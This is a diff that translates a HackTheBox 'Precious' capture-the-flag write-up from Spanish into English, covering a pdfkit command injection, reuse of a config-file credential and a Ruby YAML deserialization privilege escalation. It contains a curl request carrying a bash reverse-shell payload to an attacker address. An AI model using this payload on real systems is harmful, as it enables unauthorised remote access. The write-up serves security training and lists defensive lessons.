@@ -1,13 +1,13 @@
 # Precious
 
-**Plataforma:** HackTheBox · **Dificultad:** Easy · **SO:** Linux
+**Platform:** HackTheBox · **Difficulty:** Easy · **OS:** Linux
 
-Máquina centrada en una vulnerabilidad de deserialización en Ruby y una
-escalada de privilegios a través de credenciales reutilizadas.
+A machine centred on a Ruby deserialization vulnerability and a privilege
+escalation through reused credentials.
 
-## Enumeración
+## Enumeration
 
-Escaneo inicial de puertos:
+Initial port scan:
 
 ```bash
 nmap -sC -sV -oA nmap/precious 10.10.11.x
@@ -18,46 +18,46 @@ nmap -sC -sV -oA nmap/precious 10.10.11.x
 80/tcp open  http    nginx 1.18.0
 ```
 
-El puerto 80 aloja un servicio que convierte una URL en un PDF. Interceptando la
-petición vemos que usa `pdfkit`, una gema de Ruby con una versión vulnerable.
+Port 80 hosts a service that turns a URL into a PDF. Intercepting the request
+shows it uses `pdfkit`, a Ruby gem on a vulnerable version.
 
 ## Foothold
 
-`pdfkit` 0.8.6 es vulnerable a inyección de comandos (CVE-2022-25765) a través
-del parámetro de URL:
+`pdfkit` 0.8.6 is vulnerable to command injection (CVE-2022-25765) through the
+URL parameter:
 
 ```bash
 curl -X POST http://10.10.11.x/ \
   --data-urlencode 'url=http://x/?name=%20`bash -c "bash -i >& /dev/tcp/10.10.14.x/4444 0>&1"`'
 ```
 
-Recibimos la shell como el usuario `ruby`:
+We get a shell as the `ruby` user:
 
 ```
 $ id
 uid=1001(ruby) gid=1001(ruby) groups=1001(ruby)
 ```
 
-## Movimiento lateral
+## Lateral movement
 
-En `~/.bundle/config` encontramos credenciales en texto plano:
+In `~/.bundle/config` we find plaintext credentials:
 
 ```
 BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3********"
 ```
 
-Reutilizamos la contraseña para saltar al usuario `henry` por SSH.
+We reuse the password to move to the `henry` user over SSH.
 
-## Escalada de privilegios
+## Privilege escalation
 
-`sudo -l` revela que `henry` puede ejecutar un script Ruby como root:
+`sudo -l` reveals that `henry` can run a Ruby script as root:
 
 ```
 (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
 ```
 
-El script carga un `dependencies.yml` con `YAML.load`, vulnerable a
-deserialización insegura. Creamos un YAML malicioso en el directorio de trabajo:
+The script loads a `dependencies.yml` with `YAML.load`, vulnerable to insecure
+deserialization. We craft a malicious YAML in the working directory:
 
 ```yaml
 ---
@@ -65,10 +65,10 @@ deserialización insegura. Creamos un YAML malicioso en el directorio de trabajo
     i: x
 - !ruby/object:Gem::SpecFetcher
     i: y
-# ... gadget que ejecuta id > /tmp/pwned
+# ... gadget that runs id > /tmp/pwned
 ```
 
-Al ejecutar el script con `sudo`, el gadget corre como root.
+Running the script with `sudo`, the gadget executes as root.
 
 ## Root
 
@@ -77,8 +77,8 @@ $ sudo /usr/bin/ruby /opt/update_dependencies.rb
 $ cat /root/root.txt
 ```
 
-## Aprendizajes
+## Takeaways
 
-- Revisar siempre las versiones de dependencias contra CVEs conocidos.
-- Las credenciales en archivos de configuración son un vector recurrente.
-- `YAML.load` sin `safe_load` es deserialización insegura de manual.
+- Always check dependency versions against known CVEs.
+- Credentials in config files are a recurring vector.
+- `YAML.load` without `safe_load` is textbook insecure deserialization.
